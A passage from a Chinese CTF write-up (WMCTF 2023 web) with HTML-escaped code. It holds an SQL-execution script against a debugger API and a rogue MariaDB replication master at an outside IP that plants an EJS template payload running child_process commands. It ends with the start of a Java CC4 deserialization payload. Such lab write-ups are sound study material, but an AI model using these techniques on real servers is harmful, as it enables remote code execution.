&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;curl&lt;&#x2F;span&gt;&lt;span&gt; -X POST http:&#x2F;&#x2F;120.26.39.182:3000&#x2F;api&#x2F;debugger&#x2F;auth -d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;username=debugger&amp;amp;password=cb853bc3-3dde-4c3a-a81c-82ef52147c19&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;api&#x2F;debugger&#x2F;sql&#x2F;execute&lt;&#x2F;code&gt;执行SQL：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# -*- encoding:utf-8 -*-
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;requests
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;session &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;requests&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;session&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;proxies &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;http&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;None&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;https&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;None
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;http:&#x2F;&#x2F;120.26.39.182:3000&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;authorization &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;cb853bc3-3dde-4c3a-a81c-82ef52147c19&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(sql):
&lt;&#x2F;span&gt;&lt;span&gt;    burp0_url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&#x2F;api&#x2F;debugger&#x2F;sql&#x2F;execute&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    burp0_headers &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Authorization&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;authorization}
&lt;&#x2F;span&gt;&lt;span&gt;    burp0_data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;code&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;sql}
&lt;&#x2F;span&gt;&lt;span&gt;    r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;session&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;post&lt;&#x2F;span&gt;&lt;span&gt;(burp0_url&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;headers&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;burp0_headers&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;burp0_data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;proxies&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;proxies)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;json&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;data&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;select @@version;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;__main__&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;本地搭建 mariadb ：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;apt&lt;&#x2F;span&gt;&lt;span&gt; install mariadb-server
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;systemctl&lt;&#x2F;span&gt;&lt;span&gt; start maraidb
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;vim&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;etc&#x2F;mysql&#x2F;my.cnf
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;追加以下内容后&lt;code&gt;systemctl restart mariadb&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2e3440;color:#d8dee9;&quot;&gt;&lt;code&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;[mysqld]
&lt;&#x2F;span&gt;&lt;span&gt;bind-address = 0.0.0.0
&lt;&#x2F;span&gt;&lt;span&gt;server_id=10
&lt;&#x2F;span&gt;&lt;span&gt;log_bin=master-bin
&lt;&#x2F;span&gt;&lt;span&gt;binlog-checksum=NONE
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;进入mysql shell然后执行：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;mysql&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-mysql &quot;&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;&lt;span&gt;grant replication slave on *.* to &amp;#39;replicater&amp;#39;@&amp;#39;%&amp;#39; identified by &amp;#39;123456&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;CREATE DATABASE TEST;
&lt;&#x2F;span&gt;&lt;span&gt;USE TEST;
&lt;&#x2F;span&gt;&lt;span&gt;show master status \G;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;记录 binlog 此时高度为628&lt;&#x2F;p&gt;
&lt;p&gt;![image-20230823210439310](WMCTF 2023 web writeup&#x2F;image-20230823210439310.png)&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;mysql&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-mysql &quot;&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;&lt;span&gt;create table tb_tmp01(id INT(11),name VARCHAR(25),deptId INT(11),salar1 FLOAT,salar2 FLOAT,salar3 FLOAT,salar4 FLOAT,salar5 FLOAT,salar FLOAT,s FLOAT);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;编辑&lt;code&gt;&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;master-bin.000001&lt;&#x2F;code&gt;，找到这一行改为如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;mysql&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-mysql &quot;&gt;&lt;code class=&quot;language-mysql&quot; data-lang=&quot;mysql&quot;&gt;&lt;span&gt;select &amp;quot;&amp;lt;%=global.process.mainModule.constructor._load(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;&#x2F;readflag&amp;#39;).toString();%&amp;gt;&amp;quot; into outfile &amp;quot;&#x2F;home&#x2F;ezblog&#x2F;views&#x2F;114.ejs&amp;quot;;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;![image-20230823213644926](WMCTF 2023 web writeup&#x2F;image-20230823213644926.png)&lt;&#x2F;p&gt;
&lt;p&gt;此时高度为879。执行如下内容连接master。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;select @@version;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;create database mysql;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;use mysql;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;drop table gtid_slave_pos&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;CREATE TABLE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;gtid_slave_pos&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;` (
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;       `domain_id` &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;) unsigned &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;NOT NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;       `sub_id` &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bigint&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;) unsigned &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;NOT NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;       `server_id` &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;) unsigned &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;NOT NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;       `seq_no` &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bigint&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;) unsigned &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;NOT NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;       &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;PRIMARY KEY&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; (`domain_id`,`sub_id`)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;     ) ENGINE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;MyISAM &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;DEFAULT&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; CHARSET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf8 COMMENT&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;Replication slave GTID state&amp;#39;;&amp;#39;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;stop slave;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;change master to master_host=&amp;#39;120.26.39.182&amp;#39;, master_user=&amp;#39;replicater&amp;#39;, master_password=&amp;#39;123456&amp;#39;, master_log_file=&amp;#39;master-bin.000001&amp;#39;, master_log_pos=628;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;start slave;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;show slave status;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;show databases;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;use ctf;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;&#x2F;console&lt;&#x2F;code&gt;测试模板&lt;&#x2F;p&gt;
&lt;img src=&quot;WMCTF 2023 web writeup&#x2F;image-20230823220806719.png&quot; alt=&quot;image-20230823220806719&quot; style=&quot;zoom:67%;&quot; &#x2F;&gt;
&lt;p&gt;得到 flag。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ez-challenge&quot;&gt;ez_challenge&lt;&#x2F;h2&gt;
&lt;p&gt;有 commons-collections4-4.0 的依赖，直接打 CC4 的链子&lt;&#x2F;p&gt;
&lt;p&gt;生成 payload&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;java&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-java &quot;&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;package &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;com&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;example&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;exp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;com&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;sun&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;org&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;apache&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;bcel&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;internal&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Repository&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;com&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;sun&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;org&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;apache&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;xalan&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;internal&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;xsltc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;trax&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;TemplatesImpl&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;com&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;sun&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;org&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;apache&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;xalan&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;internal&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;xsltc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;trax&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;TrAXFilter&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;javassist&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;org&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;apache&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;commons&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;collections4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Transformer&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
